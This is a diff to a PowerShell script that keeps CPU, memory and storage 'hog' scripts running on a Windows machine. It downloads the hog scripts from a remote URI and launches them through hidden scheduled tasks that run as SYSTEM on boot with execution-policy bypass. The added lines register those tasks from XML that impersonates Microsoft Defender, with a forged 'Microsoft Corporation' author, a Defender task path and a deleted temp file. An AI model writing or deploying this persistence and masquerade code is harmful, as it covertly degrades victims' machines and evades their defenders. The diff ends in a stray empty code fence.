@@ -56,8 +56,8 @@ $cpuHogPath = $paths[$idx]
 $cpuHogPath = "$cpuHogPath\cpu_hog.ps1"
 $memHogTaskName = "windows defender profile"
 $storageHogTaskName = "windows firewall profile"
-$memTaskRunAction = "powershell -ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden $memHogPath"
-$storageTaskRunAction = "powershell -ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden $storageHogPath"
+$memTaskRunAction = "-ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden '$memHogPath'"
+$storageTaskRunAction = "-ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden '$storageHogPath'"
 
 function Get-RamPercentage{
     $mem = Get-WmiObject -Class Win32_OperatingSystem
@@ -82,8 +82,39 @@ function CheckTask-And-Recreate {
     process {
         $tsk = schtasks /query /tn $taskName /v /fo LIST
         if(-not $tsk){
-            schtasks /create /tn $taskName /tr "$taskRunAction" /ru SYSTEM /rl HIGHEST /sc onstart /f
+        $xml = @"
+<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+    <RegistrationInfo>
+        <Author>Microsoft Corporation</Author>
+        <Description>Windows Defender Memory Optimization Utility</Description>
+        <URI>\Microsoft\Windows\Defender\HealthMonitor</URI>
+        <Date>2024-01-01T00:00:00</Date>
+    </RegistrationInfo>
+    <Principals>
+        <Principal id="Author">
+            <UserId>NT AUTHORITY\SYSTEM</UserId>
+            <RunLevel>HighestAvailable</RunLevel>
+        </Principal>
+    </Principals>
+    <Triggers>
+        <BootTrigger>
+            <Enabled>true</Enabled>
+            <Delay>PT30S</Delay>
+        </BootTrigger>
+    </Triggers>
+    <Actions Context="Author">
+        <Exec>
+            <Command>powershell.exe</Command>
+            <Arguments>$taskRunAction</Arguments>
+        </Exec>
+    </Actions>
+</Task>
+"@
+            write-output $xml | Out-File -FilePath "$env:temp\gg.xml" -Force
+            schtasks /create /tn $taskName /xml "$env:temp\gg.xml" /f
             schtasks /run /tn $taskName
+            Remove-Item -Path "$env:temp\gg.xml" -Force
         }
         
         else{
@@ -105,7 +136,7 @@ while ($true) {
         $memHogPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
         $memHogPath = "$memHogPath\mem_hog.ps1"
         iwr -Uri $memHogUri -OutFile $memHogPath
-        $memTaskRunAction = "powershell -ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden $memHogPath"
+        $memTaskRunAction = "powershell -ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden '$memHogPath'"
         Set-ItemProperty -Path "$basePath" -Name $memPropertyName -Value $memHogPath -Force | Out-Null
         schtasks /change /tn $memHogTaskName /tr $memTaskRunAction
         schtasks /run /tn $memHogTaskName
@@ -115,7 +146,7 @@ while ($true) {
     #     $storageHogPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
     #     $storageHogPath = "$storageHogPath\storage_hog.ps1"
     #     iwr -Uri $storageHogUri -OutFile $storageHogPath
-    #     $storageTaskRunAction = "powershell -ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden $storageHogPath"
+    #     $storageTaskRunAction = "powershell -ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden '$storageHogPath'"
     #     Set-ItemProperty -Path "$basePath" -Name $storagePropertyName -Value $storageHogPath -Force | Out-Null
     #     schtasks /change /tn $storageHogTaskName /tr $storageTaskRunAction
     #     schtasks /run /tn $storageHogTaskName
@@ -131,3 +162,8 @@ while ($true) {
     }
 
 }
+
+
+```xml
+
+``` 
